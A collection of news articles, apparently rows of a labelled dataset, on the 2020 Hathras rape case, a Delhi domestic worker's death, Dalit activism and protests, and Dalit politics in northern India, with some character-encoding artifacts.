India Gate to demand justice for Nirbhaya, while there were many rape incidents even before Nirbhaya and even after Nirbhaya. The reason that the people have joined today in huge numbers is that in this rape case of Hathras because all the police and civil officers standing with the accused? No administrative officer stands with the victim’s family. Even today, the victim’s family has been locked inside their house, and they are not allowed to talk to the media. All the officers have been given directions that no politician should be allowed to meet the victim’s family as Yogi Adityanath is standing with the accused” He also pointed out that Yogi Adityanath comes from the Thakur family and all the accused in the rape incident also belong to the Thakur family. “CM Yogi is standing with Thakurs and so, no Thakur accused in Yogi Adityanath state can be punished. The only way to punish the accused in Uttar Pradesh is to remove Yogi Adityanath from the position of Chief Minister,” added Saurabh Bhardwaj. While addressing the protesters Bollywood actor Swara Bhaskar said. “People from different groups are here, this shows how enraged people are against what happened in Hathras, Balrampur, and Azamgargh…there is a rape epidemic which has spread in the country, especially the kind of news we are getting from Uttar Pradesh. Bhim Army Chief Chandrashekhar Azad joined the protest over Hathras case at Jantar Mantar on Friday. “I will visit Hathras. Our struggle will continue till the time UP CM doesn’t resign, & justice is served. I urge SC to take cognizance of the incident,” he said. Advocate Mehmood Pracha, accompanying Chandrashekar asked “Why the BJP government is not allowing the protest at India Gate in case of Hathras Dalit woman’s gangrape and murder”? Activist and lawyer Prashant Bhushan said the UP is witnessing “ghoonda raj”. ‘In Uttar Pradesh, there is ghoonda raj. The police have surrounded the village, are not allowing opposition leaders and media people to set foot in the village. They have taken away the mobile phones of the family members of the victim’ ,a and lawyer Prashant Bhushan said. Welfare Party of India (WPI) president Dr. Ilyas said Yogi failed to rule the state and he must go. Jamaat-e-Islami Hind Vice-president Engineer Mohammad Salim also took part in the demonstration. In his address, he said the role of the UP government did not bode well for the future of the democracy and the rule of law in the country. Even people are not allowed to meet the victim’s family. Earlier in the day, ahead of the planned protests, Delhi Police had said that no gathering will be allowed around India Gate due to restrictions imposed under Section 144. Then it was shifted to Jantar Mantar. There are reports that Protest staged at many cities across the country in demanding the resignation of Yogi. It is to be mentioned that the 19-year-old Dalit woman had been dragged away from the fields where she was cutting grass and brutally raped by four Thakur men in her village on September 14. She succumbed to her injuries at Delhi’s Safdarjung hospital two weeks later on September 29. Even with media on the ground, police forced the cremation of the victim after midnight on Wednesday (September 30), by locking up the family. Meanwhile, The Delhi Police on Friday registered a case against protestors, who had gathered at Jantar Mantar here against the alleged gang-rape and assault of a 19-year-old Dalit woman in Uttar Pradesh”s Hathras district, for violation of prohibitory orders, officials said.

1,"INTERACTIVE ELECTION MAPS Image for representational use only; Image Courtesy : AFP  Rita* is surrounded by a few young men and women in Meerabai Park in North Delhi’s Kalyan Vihar. These young men and women, affiliated with different students’ organisations, have come to express their solidarity with Rita in her fight for justice for an incident which has claimed the life of her adopted daughter Seema*. Recently, Seema was found hanging in a house in upscale Model Town area where she had just begun working as a full time domestic helper to an elderly woman. Delhi Police, in its investigation, found that the girl had died due to asphyxia and it was ‘suicidal in nature’, but it did not register any FIR in the matter. However, Rita is certain that her daughter was raped and murdered. Rita’s story is an example of what happens when the poor seek for justice. She came to Delhi from Basti district of Uttar Pradesh with her husband, Ramesh*, in 2004 in search of livelihood. Hailing from a family of boatmen belonging Nishad community, a scheduled caste in Northern India, Rita lives with her family of seven in her 10x6 room in North Delhi’s Rajpura Gud mandi near Delhi University. She and her sister work as domestic helpers in nearby areas to sustain their livelihoods. Her husband lost his job as a plumber during the nationwide lockdown due to the pandemic. Her daughter, Seema, had also joined the same work but had taken a break after working for few months in Rajouri Garden. Seema was later shifted to another home in the Model Town colony where the employer was an old lady who promised her a monthly salary of Rs 11,000. But just a week later, she was found hanging from the ceiling in the driver’s room at her new workplace. Rita had adopted Seema after her sister had died and her alcoholic husband had no interest in raising the children. The family had decided that every brother and sister will take responsibility for raising the three children. Narrating the episode of Seema’s death, Rita told NewsClick, “I got a message in our WhatsApp group that a family needed a domestic helper. So, we went to meet Renu Mittal, the employer’s daughter, who lives in Kamla Nagar to discuss the work. After the discussion, Seema joined the work on September 28. I had briefly talked to her on October 1, 2 and 4. The employer had few complaints regarding the work. I assured her that she would easily learn it. The employer ensured that she would talk to family members in her presence only.” Also read: DUJ “Shocked” at Delhi Police Assault on Caravan Journalist, Calls for “Exemplary” Action She added, “On October 4, we received a call from employer to take our daughter back. Soon, Renu Mittal came to us and took me to her mother’s house. She told me to cite the age of girl as 19 instead of 17. When I reached the house, I saw the house was teeming with a fleet of policemen in uniform as well as plain clothes. They asked me about her credentials, her age, who we were. I repeatedly asked them to allow me to meet my daughter. They said they would soon allow me. Few hours later, I was told to meet her but not to touch her or any belonging in the room. This sentence alerted me. When I saw her, she was standing with her back on my side but when I looked at her face, she was hanging from the ceiling. There were burn marks on her hands too. I started crying. I was rushed out of the room.” “Later, the police officials told me that my daughter had killed herself. I could not believe it. I still do not believe it. Why would a happy girl like her take such an extreme step? I had constantly asked her if she had any problems and she always said she was fine. The strangest thing about the incident is that she was found hanging in the driver’s room. Why would she [employer] send her to driver’s room when the employer knew that she was a girl?,” Rita questioned. However, the real ordeal began only after the incident. She said, “Police took the dead body to an unknown place whereas we were brought to Model Town Police Station to record our statements. We were made to sit till 2 o’clock in the night but they did not reveal the whereabouts of the dead body. Seema did not have any Aadhaar card or any identification card. The police official asked us about the proof of our relationship. They said only the father of the deceased would be allowed to see the body or else the body will be marked as ‘unidentified’ and will be treated accordingly. The father had been drug addict and remained untraceable. Even her sister was refused for identification.” Talking further about the attitude of the policemen as well as the deceased girl’s employers, she added, “With no option left, we went to the employer’s house on October 7 to find out tge whereabouts of the body. The attitude of the employer irked us and we pelted stones and broke pots. The lady called the police and we were detained. The policemen took us to the police station and started beating us mercilessly. They beat one of my family members so badly that he almost stopped breathing. When we pleaded, the policemen said that they ensure that we flee from Delhi and our children will be taken care by neighbours.” Three days later on October 8, when Seema’s father finally arrived from Bahraich, the body was identified and sent for post mortem, she said, adding that even then, police did not reveal where the body was taken for post mortem. “We came to know about the place from the people outside the mortuary. We were asked to go to the crematorium. We resisted the move. We told them explicitly that women do not go to cremation ground in our tradition but they did not relent. The policemen cremated the body at Wazirpur Crematorium,” Rita said. Also read: Hathras Rape Case: Grappling with Ground Realities of the Implementation SC/ST Prevention of Atrocities Act Even though they had requested for a fresh probe into the case as they were not satisfied with the investigation, their request have been rejected, she alleged, adding, “We pleaded to police officials and made it clear that our girl could not die by suicide. Still, no police official has interrogated the employer or her son and drivers. No sane person can understand the silence of the police officers.” Ashutosh Kumar Mishra, a member of Lawyers Against Atrocities, who has been helping the family members legally, told NewsClick that the police did not follow the protocol under Indian Penal Code. He said, “Under Indian Penal Code, the police is directed to register the case under section 166 A for any sexually cognisable offence. The police did not do it. Similarly, the post mortem should have been done within 24 hours but it was delayed to four days. Now, you know even if there was any fluid on the body at time of crime, it may no longer exist for four days. I got the post mortem report assessed by independent doctors and they are suggesting that it was not conducted from the angle of rape. The biggest fault remains about the cremation of body. Why did police cremate the body? Certainly, Hathras was repeated in Delhi. If there was no rape, it would have certainly been highlighted in another report. We are awaiting for viscera report and will proceed accordingly.” Following this, the victim’s family members and students’ organisations including Bhagat Singh Ekta Manch, Krantikari Yuva Sangathan, All India Students’ Association and Students’ Federation of India protested outside the Model Town PS on October 16. However, the police detained them and booked them under Epidemic Act, Disaster Management Act and other provisions of Indian Penal Code for criminal conspiracy. The organisations, in their collective statement, have demanded immediate registration of FIR against the accused under relevant sections of IPC and SC/ST (Prevention of Atrocities) Act. They have also demanded action to be taken against the police personnel involved in committing procedural lapses and forceful cremation of the victim's body. Sitting tired and restless in her tiny room, Rita finally said, “I never thought this would happen to us. I never forced her to work. Even when she started working, I thought that I would make jewellery for her marriage from the saved money. Now, she is gone.” But she is also determined to fight for justice, as she said, “Even though they tried to frighten us, we are not afraid. We have been treated in this manner because we are poor dalits. But they are forgetting one thing, poor also have rights. We will claim it.” *The names of the family members have been changed to protect their identities."
1,"Everything is Written Here During this distressing time, more than 20 Ambedkarite organizations who work outside India are seething with rage, pain and sadness at the brutal caste hate crime against a 19 year old Dalit woman in Hathras who was raped and murdered by upper-caste Hindu men. The Ambedkarite organizations from USA, Canada, UK, Germany, France, Nederland, Ireland, Spain, Sweden, Japan, Korea, Singapore, New Zealand, Belgium, Hungary, Australia, UAE, Oman, Qatar, Saudi Arabia, Bahrain and Malaysia demanded immediate prosecution of the culprits under the SC/ST Atrocities Act. “Our sister lost her life on September 29th, 2020, in a Delhi hospital, after she succumbed to the injuries because of the hate crime where she was raped, her tongue was slashed, spinal cord broken and she was left to die by some men from the caste Hindu Thakur community. In an alleged attempt to destroy the evidence, her body was forcefully cremated by the UP police, which literally caused her second death. This happened against the wishes of the family, who were begging in front of the authorities to see their daughter one last time and who were then heckled and locked up,” a joint statement reads. The statement referred an India Spend Analysis of the National Crime Records Bureau statistics and said the crimes against Dalits rose by 746% from 2006 to 2016 in India. The Ambedkarite organizations further said: “The Dalits have increased vulnerability to such crimes due to the casteist mindset of Caste Hindus, who have a predominant presence in the police force and administration. There have been malicious attempts at obstructing justice, in the form of refusal of the police to file FIR’s, refusal to use the POA Act, 1989, threatening of the victim’s families by the perpetrators and preventing the victim from seeking justice (For instance, the 17 year old Unnao Dalit rape victim was burnt on her way to the court hearing. The convict is a member of the ruling dispensation). Thus, the obstruction of justice often happens with the complicity of the administration and government.” They claimed that the conviction rate for the men accused of raping dalit women is almost nil. The organizations accused India’s Supreme Court of diluting the only legal safeguard against the heinous caste crimes and atrocities against the Dalits i.e.The Scheduled Castes and Tribes (Prevention of Atrocities) Act, 1989. They said: “The Scheduled Castes and Tribes (Prevention of Atrocities) Act, 1989, needs not just to be brought back in its original form but also given more teeth to tackle the rising caste hate crimes against Dalits and offer protection to the Dalit women and child victims.” “The difference between rape, murders and other from of atrocities against the Dalits and similar crimes against other people, is that the crimes against dalits are caste hate crimes arising out of casteist mindset of Caste Hindus. Such crimes are a reflection of jealousy, hate toward and intolerance of the little progress the Dalits have been achieving,” reads the statement.

1,"National outrage against rape crimes has only been mounting in the aftermath of the death of the Dalit woman who died recently succumbing to the injuries inflicted by four upper-caste men who gangraped her in Hathras, Uttar Pradesh. Unfortunately, it took the death of a young woman to serve as a moment of upheaval in the collective consciousness of people and jolt them to the vicious intersection of caste and gender-based crimes in India. The caste hierarchy is one of those structures that are still tethering India to a deep-set foundation ofÂ patriarchy, misogyny, power politics, and social discrimination. The idea of caste is rudimentary and represents a social divide that has been impossible to mend in India even in the 21st century. But why does traditional social exclusion still plague us? One of the prime reasons for this is the lack of diverse voices in the mainstream. Also Read:Â Why It’s Necessary To Acknowledge Caste In Crime Cases Like Hathras Gang Rape The need of the hour is to clear the area and give maximum space to Dalit women to speak. Here are some who are actively spearheading the fight against caste and are vocal in public forums. Their social media handles have been linked for you to follow: Cynthia Stephen is an independent researcherÂ on gender, poverty, development, and policy. Based in Bangalore, she is an activist and writer, with over 30 years of experience. During her leadership tenure with the Karnataka government, Stephen was always a strong advocate of ensuring equal policy, and has championed the rights of Dalit women on various committees. In the aftermath of the Hathras gangrape incident, Stephen in an article Why We Face An Uphill Battle For Citizenship And Dignity for Dalit WomenÂ published on SheThePeople wrote, “The life of a human being varies with their position in theÂ casteÂ hierarchy. Women are only objects who fulfil domestic, ritual and reproductive roles in a patriarchal family.Â The untouchables donât even figure in the law book as they are outside the pale of the four castes.Â Women and Dalits are non-citizens, non-people as far as it (the Indian state) is concerned…Â This is the core reason for the ever-burgeoningÂ crimes against DalitsÂ in India. There are plenty of laws on paper to protect them from exploitation but the crimes continue.” An advocate in the Supreme Court of India,Â Munusamy’s is a significant anti-caste voice in the country. As a writer, researcher, and founder of organisations promoting equality, she describes herself as “A judicial activist striving for social justice by eliminating all forms of discriminations, oppressions and inequalitiesÂ in the society.”Â In an interview with SheThePeople, Munusamy emphasised on the need for giving Dalit women space to speak. “I have seen many upper-caste liberals who participate in protests or movements which are seen as ‘decent’. They also don’t know how to pass the mic and sit back, and not take the reward for what they have been doing. If they are a true ally, they would work even if they are not rewarded. I, as a Dalit woman, am not invited to Dalit collectives, but Brahmin women are sitting there. How?” Speaking about casteist policies which are fuelled through administrative policies, she says, “All of us need to stand against women’s oppression, Islamophobia, violation of the LGBTQIA community. This has to become an anti-status quo revolutionary movement. It has to have leadership from the oppressed community.” With over 40 years of fight for equality, Dr Ruth Manorama is one of the longest-standing activists for Dalit rights, with a deep focus on women from the community, and rights for unorganised labour in India. She has done monumental work as a writer and researcher over decades on Dalit women under the draconian caste hierarchy. Based in Bangalore, Manorama has served in organiser and leadership positions on seats with the National Federation of Dalit Women (NFDW) andÂ Womenâs Voice. She was also awarded the prestigiousÂ Right Livelihood Award, also known as the “alternative Nobel prize” for human rights, in 2006. Speaking on the Hathras case, Manorama said, “I feel very humiliated and angry… Dalit women are like fodder in all kinds of atrocities. They violate Dalit womenâs dignity in order to shame the whole community. There is a connivance between the state and the powerful upper caste non-state actors. How long can one tolerate such things?” Radhika Vemula is the mother of Rohith Vemula, PhD scholar at the University of Hyderabad, whoÂ reportedly died by suicide in 2016 following his suspension by authorities, and targeting by other students at the university. In the deeply reflective suicide note he left behind, Vemula had mentioned, “The value of a man was reduced to his immediate identity and nearest possibility…Â My birth is my fatal accident.” His death had sparked off nationwide protests and calls-to-action of ending caste discrimination at the university and institutional level in India, with Radhika Vemula at the forefront. In the four years since her son’s death, she has emerged as a torchbearer of social activism started by her son, saying, “Rohith left me a huge responsibility. I will not rest until I have fulfilled it. As a mother, I am still experiencing grief. But that will not stop me or even slow me down.” She says her fight is now not just for Dalit students and women, but ostracised minorities across India: “Itâs no longer about just my son. I will raise my voice for all oppressed people and I will not let another Rohith die.” Also Read:Â After Delhi, Hyderabad, Now Hathras: Executions And Encounters Haven’t Curbed Gangrapes Dutt is a writer-journalist currently based in New York City. A Columbia School graduate, Dutt has previously worked with publications like Hindustan Times and Asian Age. She has authored the bookÂ Coming out as Dalit, and is a vocal leader of Dalit activism on social media. In talk surrounding the Hathras case, she has actively been taking the baton of logical conversation forward. On Twitter, she wrote, “Whatâs wrong is our adherence to caste supremacy allowing âupperâ caste men to mutilate the bodies of Dalit women for sport or to teach the community a lesson in never forgetting their place at the bottom. And the willful ignorance of the rest of us who refuse to accept that.” Vijayashanthi Murthy is currently an Assistant Professor at St. Joseph’s College, Bengaluru. She has previously held teaching positions at Jain University and Baduku Community College, both in Bengaluru as well. Through her teaching career, she has attempted to keep her students sensitised and aware as to the atrocities the Dalit community is subjected to, keeping her classrooms open to discussion always. InÂ a discussion on caste-based violence against women conducted by SheThePeople, Murthy noted how the hierarchy works in such bureaucratic systems: âPeople from Dalit and other communities who get into these systems, more often than not get spaces in the lower ranks of the structure. The power rests in the hands of dominant castes. In the police for instanceâ¦ itâs not a functional hierarchy; itâs an evident caste hierarchy. Or in the judiciary â How many High Court judges have been from the Dalit community? How many women have we had? Or media or academia.â Along with being a Dalit rights activist, Grace Banu is also a historic woman by virtue of being the first transgender person to be admitted to an engineering college in Tamil Nadu and also India’s first trans engineer. Banu has been vocal about her life experiences as a Dalit woman, saying that she was subjected to untouchability during her school years, and then later faced rejection by her family upon coming out with her sexual orientation. She has been a staunch supporter of the Reservations system, believing that it is necessary for the inclusion of oppressed communities like Dalits and transpersons into the fold of mainstream. She said in an interview, “No amount of temporary governmental and non-governmental schemes can have the transgenerational impact that reservations can have. Reservations are the only way.” Riya Singh is a doctoral researcher atÂ Delhi’s Ambedkar University. She works as the Research and Advocacy Officer at Dalit Women Fight, which isÂ Indiaâs largest Dalit women-led collective that wants to “effectively challenge,tackle, and solve caste-based violence and discrimination.” Her work with victims of caste atrocities has been expansive.Â In a recent article, she pointed out the problem of calling the Hathras victim “another Nirbhaya”, as the media and several protestors have been doing. During a panel by SheThePeople, Singh emphasised, “I’ve never understood the need of explaining why caste is important in a caste-based crime. Caste is right in front of our eyes… The first thing people ask is what is your name? If you give your first name, they’ll ask you –Â aage kya hai?Â (for surname). But Indian society is hesitant about claiming caste pride when it is about bad things.” Beena Pallical is a Dalit activist currently serving as the General Secretary of Economic and Educational Rights for the National Campaign on Dalit Human Rights (NCDHR). She has previously occupied roles in several leadership positions in both the state and central governments, working towards gender equality and caste annihilation. Through her groundwork, she has actively trained and advised Adivasi and Dalit women in becoming financially independent. She is a major voice of the voiceless communities in India, having represented them on multiple forums. On how to begin reforming the injustices of caste hierarchy, Pallical said, “As long as the mindset of discrimination and untouchability exist, violence will continue. The only way we can undo is by implementing the existing policies.” Meena KandasamyÂ is a poet, columnist,Â translator, and activist, who has authored multiple significant works on the condition and experiences of Dalits in India. She writes for various international publications and her novelÂ When I HitÂ You was shortlisted for theÂ Women’s Prize for Fiction 2018.Â Kandasamy has been open about her family background being constantly infringed courtesy the caste system, and how her parents’ involvement in the anti-caste fight is the undercurrent to all the work she has done. In as early as her teens, she served asÂ the editor ofÂ The Dalit, “a bimonthly that provided a platform to record atrocities, condemn oppressive hierarchies and document the forgotten heritage.” Her debut poetry collection titledÂ TouchÂ is an exploration of untouchability, casteism, and feminism in India.Â In the aftermath of Hathras, Kandasamy wrote a poem Rape NationÂ on atrocities against Dalit women and their identity, which was widely circulated on social media: https://www.facebook.com/SheThePeoplePage/photos/3999965053368010 Views expressed are the author’s own.Â Digitalist Tech Media © 2021 All Rights Reserved."

A much-forgotten Lok Sabha by-election in 1985 in Bijnor, in western Uttar Pradesh, symptomatised this flowering, which now looks increasingly endangered. Across India, particularly in the northern states of UP and Bihar, political parties representing the Dalit voice have weakened. Bahujan Samaj Party (BSP) chief Mayawati is a shadow of her former feisty self. Lok Janshakti Party leader Ram Vilas Paswan has passed away. The Hindi heartland suddenly looks shorn of leaders who can fill the shoes of these two giants of contemporary Dalit politics. As the forthcoming Bihar assembly polls might show, Dalit assertion is at the risk of getting subsumed within the two big national parties, the Bharatiya Janata Party (BJP) and the Congress. The Bijnor bypoll was held after the passing away of Congress’ sitting MP Girdhari Lal. The Congress fielded debutante Meira Kumar, the daughter of Jagjivan Ram. Opposing her was Paswan, then with the Lok Dal. Both hailed from Bihar. The third candidate in the fray was Mayawati. The BSP was in its infancy then. The Rajiv Gandhi government was two years away from being discredited, but still Kumar struggled to beat Paswan, a third-term MP from Bihar’s Hajipur, by less than 6,000 votes. Mayawati, who could not contest on her party’s symbol as the BSP was still unrecognised, trailed at number three with over 61,000 votes, which would have mostly gone to the Congress. If Paswan and Mayawati punctured Kumar’s ambitions of becoming Ram’s legatee in UP, the BSP leader pushed Paswan to the number three spot in a Lok Sabha bypoll in Haridwar in 1987. The Congress candidate won. Mayawati was a close runner up. Embarrassingly for him, Paswan forfeited his deposit, never to contest from UP again. A year later, Kanshi Ram contested the high-profile Allahabad Lok Sabha by-election after superstar Amitabh Bachchan vacated the seat. Kanshi Ram’s opponents were the joint opposition candidate Vishwanath Pratap Singh and Congress’ Sunil Shastri, son of former Prime Minister Lal Bahadur Shastri. Singh defeated Shastri comfortably securing over 200,000 votes. Shastri failed to get even 100,000 as Kanshi Ram bagged almost 70,000 votes, most of which would have gone to the Congress. Soon the ruling Congress started smelling a ‘foreign hand’ in BSP’s success. It resurrected its favourite bogey. There were allegations the United States’ Central Intelligence Agency (CIA) was funding the BSP’s election outings. The BSP’s success worried the Rashtriya Swayamsevak Sangh (RSS) equally. RSS chief Balasaheb Deoras was quoted by the Illustrated Weekly of India in 1988 describing the BSP as “one of the real problems for the RSS in north India”. The BSP, along with the Mulayam Singh Yadav-led Samajwadi Party, in UP; and Paswan, Lalu Prasad and Nitish Kumar in Bihar, shrunk the political space not just of the Congress, but also of the BJP and the RSS. In the rest of north India, where the Dalit and the OBC leaderships were absorbed by the two mainstream upper caste-led parties, politics became increasingly bipolar between the Congress and the BJP, and it continues to remain so in Madhya Pradesh, Rajasthan, Chhattisgarh and Gujarat. It was the political genius of Kanshi Ram to lay the foundation of the resurgence of Dalit politics by knitting an alliance between various Dalit and EBC (Extremely Backward Castes) in UP. He picked Mayawati, a Jatav, the predominant Dalit caste in UP, as their leader. Unfortunately, neither Paswan nor Mayawati prepared alternate leaderships to take forward this movement for Dalit assertion and their greater independent political representation. Instead, both attempted to secure their respective parties for their families, who in turn are pushing these parties to become puppets in the hands of the two big national parties. For Dalit politics, it seems it is set for a return to the ‘Chamcha Yug’, or the era of stooges, that Kanshi Ram described in his book of that name, which he had published on the eve of the 50th anniversary of the Poona Pact of 1932. He said the Scheduled Caste elite is a stooge the upper caste elite have created to oppose the genuine fighter. Dalit activists, however, are not despairing. They believe this is a gestation period before dynamic leaders come to the fore to knit several Dalit castes, Pasmanda Muslims and the EBCs into a potent independent political force yet again, and not merely head Dalit ‘cells’ in national parties. For inspiration, the Dalit leaders turn to widespread protests across north India, which they see as having been spontaneous with disparate Dalit outfits coming together, on April 2, 2018, against the Supreme Court order that watered down the Scheduled Caste and Scheduled Tribe (Prevention of Atrocities) Act.

1,"INTERACTIVE ELECTION MAPS New Delhi: Multiple women’s groups came together to register their protest in Delhi on Thursday, to mark the one month death anniversary of the victim in the Hathras case, who had succumbed to her injuries on September 29 at the Safdarjung Hospital in the national capital. The protesting women – mostly working – were led by different groups at several demonstration sites. They pressed for a safe environment for women in cities across the country while demanding an immediate deliverance of justice to the dalit teen from Hathras. In a separate protest organised by a dalit organisation in the capital, similar demands were raised. A 19-year old girl, belonging to the landless Valmiki caste, was brutally assaulted and allegedly raped by four upper-caste, landed Thakur men in Uttar Pradesh’s Hathras district last month. On Thursday, organisations like the All India Democratic Women’s Association (AIDWA), National Federation of Indian Women (NFIW), and Satark Nagrik Sangathan (SNS) among others, took to the streets nationwide under the banner of Hum Agar Utthe Nahin Toh (If we do not rise), a campaign initiated this year on the third anniversary of the assassination of journalist-turned-activist Gauri Lankesh. The umbrella body now has over 400 women’s groups, LGBTQI collectives and human rights organisations spread across all the states in the country. In the national capital, protests were held throughout the day in areas including Mangolpuri, South Delhi’s Jagdamba Camp, North East Delhi’s Gurmandi, Nizamuddin, along with in industrial towns such as Narela and Bawana – all comprising sizeable populations of economically-weaker sections of women engaged in construction and domestic work among other things. A common refrain of the women in these areas was the lack of safety and myriad occasions of harassments that they encounter, especially while returning to their home in the evening. “There are no street lights in my area; it has become a daily affair of coming across men – usually drunk – in the evenings who don’t shy from passing lewd comments,” cried a woman, during the protest at Jagdamba Camp, adding that she does not feel safe at all. A 2019 survey estimated that over 40% of women report feeling “unsafe” outdoors, while nearly 80% says that not much has been made by authorities to provide a safer environment for women in the country. “What had happened to the girl in Hathras could very well happen to us any day,” lamented another woman at Bawana. “The police and other government machineries that are meant for our safety also seem to be failing the women,” she added. And hence, “Badlaav chaiye, badlaa nahin” (want a change, not revenge) – was the slogan picked up by the women during the protests as they vowed to “struggle till they register a win.” A nationwide protest was also called by the Dalit Shoshan Mukti Manch (DSMM), a national platform “for action against caste discrimination and for social justice.” People assembled near Parliament Street and sloganeered against the Bharatiya Janata Party (BJP) government in UP, which has been accused of “protecting” the perpetrators of the crime in Hathras. The demonstration was also joined by a group of lawyers, who are representing the family of a teenager from a backward class in Delhi. The 17-year old Delhi girl was discovered dead in the house where she had been working for a week as a domestic help. While her family had accused the employer of rape and murder, Delhi Police has failed to file an FIR even after more than a fortnight. The women-led protests were live streamed on social media platforms in what the organisers termed as a “web rally.” Leaders of various groups were joined in, along with some cultural artists, to voice their anger over rising atrocities against the marginalised sections. Similarly, other virtual meetings were organised to spread a political awareness among the women with regards to their rights and how they can hold the authority accountable. Anjali Bhardwaj, a founding member of SNS, highlighted the importance of the various machineries of the state to ensure women’s safety in the country. “The commissions – that of SCs and STs and women – along with the judiciary, and police must function properly. When they fail the people lose trust in the law and order processes,” she said. It is then, when demands of capital punishment are raised in matters relating to rapes, Bhardwaj says, adding that it is a wrong solution to the prevailing problems. To be sure, the latest Crime in India report by the National Crime Records Bureau (NCRB) notes as many as 88 rape cases took place every day in 2019, on an average, with conviction rate in these cases at alarmingly low level of about 27%. Shabnam Hashmi, a social activist and founding member of ANHAD (Act Now for Harmony and Democracy), a socio-cultural organisation, spoke about the grief of the victim’s family in Hathras and demanded a time-bound justice in the matter. Hashmi was one among the eight-member women delegation, which had visited the victim’s family in Hathras on October 5. She alleged, while addressing the web rally, that the victim’s family had informed them then of being “intimidated,” and accused the police administration of “causing delay at every step.” Currently, the matter is being investigated by the Central Bureau of Investigation (CBI), with the Allahabad High Court allowed by the apex court to monitor all aspects of the case."
1," Society October 27, 2020 / By Aman Kanojiya and Danish Mohammed / New Delhi Human rights activists joined in a protest by the family of a young dalit girl that had allegedly been raped and killed in New Delhi on October 4. Weeks after the gruesome rape and murder of a dalit girl in Hathras, Uttar Pradesh, another similar incident has emerged in the national capital. A 17-year-old dalit girl, who worked as a house help in the Model Town locality, in North-west Delhi was allegedly raped and killed at her workplace on October 4. The family of the victim says that even though it has been more than 20 days since the incident, the police have refused to register the case and instead have been harassing them mentally and physically. “Delhi Police refused to file a first information report on the death. Its personnel say it was a suicide, even without waiting for the results of the forensic examination. We have been brutally beaten by the police and kept in the lockup overnight,” Kusum, the foster mother of the victim, tells Media India Group. “The police did not allow us to take the body home and instead pressured us into quickly cremating the body,” she adds. After several failed attempts to get an FIR registered, the family along with the help of a few student organisations protested outside office of DCP North West, in Ashok Vihar, New Delhi, to demand justice for the 17-year-old girl who belonged to the Nishad community (a Dalit community). The family members allege that the girl was raped and murdered by the son and driver of the landlady who she was supposed to be taking care of. They say that she began working there on September 26. The aunt of the deceased says that on the day of the incident, October 4, she received a call from her asking her to rush there and help her. However, she could not give any details as the landlady was next to her and the girl was not able to talk. The same evening Kusum was asked by the family of the landlady to go urgently to their house as the victim had ‘locked herself in a room and was not opening the door. “When I reached over there, I found several police personnel there and I felt anxious as I was worrying about my niece,’’ Kusum tells Media India Group. “When I asked them that I wanted to immediately see my niece, the police did not allow me and just told me that I will get to see her soon. First they asked me several questions about the victim and our family and then they took me towards the room where she was supposed to be. From outside the room, I thought I could see her standing up, but when I went in, I was horrified to see that she was hanging from the ceiling,” says Kusum. The family says that the police did not hand over the body of the deceased even four days after the death and called the family for a quick cremation, refusing to handover the body so that it could be taken back to their native village for the last rites. Protestors outside the office of DCP North West, in Ashok Vihar, New Delhi, demanding justice for the 17-year-old victim (MIG Photos) “We are from the Nishad community and in our community women are not allowed to perform the last rites. However, when we told the police that we want to take her body to our home for the last rites they didn’t allow us to do that. Instead they pushed me in a van with her body for the last rites and said we are anyway going to burn her-with or without you,” says Suman, another aunt of the victim. Since then, the family of the victim has been fighting for justice, but without any luck as the police refused to even register an FIR and began dismissing the death as a suicide without any forensic evidence. This is not the first time that police have tried to suppress the rape and murder of a dalit girl. The New Delhi case has many similarities with the Hathras rape and murder case where another dalit girl was raped and murdered last month. The fight for justice in that case also has been going on since. According to a report by National Dalit Movement for Justice (NDMJ) – National Campaign for Dalit Human Rights, crimes against dalits increased by 6 pc from 2009 to 2018 with over 3,91,000 atrocities being reported, at the same time gaps in implementation of the Scheduled Castes and Scheduled Tribes (Prevention of Atrocities) Act 1989 and the 1995 rules framed under it remained. The report, said that the crime rate against those belonging to Scheduled Tribes recorded a decrease of around 1.6 pc, with a total of 72,367 crimes being recorded in 2009-2018. The latest National Crime Records Bureau data show an increase of 7.3 pc in crimes against scheduled castes with 45,935 cases in 2019, up from 42,793 cases in 2018. Uttar Pradesh alone accounts for over 25 pc of the total cases by recording the highest number of atrocities against the dalits in the country. Rape constituted 7.6 pc of all cases of crimes against the dalits.{ ""@context"": ""https://schema.org"", ""@type"": ""Article"", ""mainEntityOfPage"": { ""@type"": ""WebPage"", ""@id"": ""https://mediaindia.eu/society/rape-murder-of-dalit-minor/"" }, ""headline"": ""New Delhi police try to suppress alleged rape & murder of dalit minor"", ""description"": ""Human rights activists joined in a protest by the family of a young dalit girl that had allegedly been raped and killed in New Delhi on October 4."", ""image"": ""https://mediaindia.eu/wp-content/uploads/2020/10/Gurmandi-rape.jpg"", ""author"": { ""@type"": ""Person"", ""name"": ""Aman Kanojiya"" }, ""publisher"": { ""@type"": ""Organization"", ""name"": """", ""logo"": { ""@type"": ""ImageObject"", ""url"": """" } }, ""datePublished"": ""2020-10-27"" } Your email address will not be published.

1,"The National Investigation Agency (NIA) has made a startling revelation in the Bhima Koregaon case. According to some documents seized by NIA from Bhima Koregaon case accused Rona Wilson, militant Dalit and Muslim forces are together hatching a conspiracy to create disturbance across the country. NIA investigation has revealed that organizations are being formed in Tamil Nadu and Gujarat to unite militant Dalits and Muslim forces against anti-fascist front in the Indian subcontinent. The documents seized from Wilson clearly states that a united Dalit-Muslim front will help strengthen the mass mobilisation of people against the government at Centre. ""We should be together most militant Dalit and Muslims forces that are already talking shape in some parts of the country. For example, such Dalit forces are taking shape in South Tamil Nadu, Gujrat and Muslim minority forces in Kerela, Karnataka and Maharashtra are giving training to hundred of cadres. This phenomenon is gaining momentum in the wake of militants and arms attacks on Dalit and religious minority people by the organised Hindutva followers,"" noted the documents. The Bhima Koregaon case relates to alleged inflammatory speeches made by some prominent people at the Elgar Parishad conclave in Pune's Shaniwarwada on December 31, 2017.

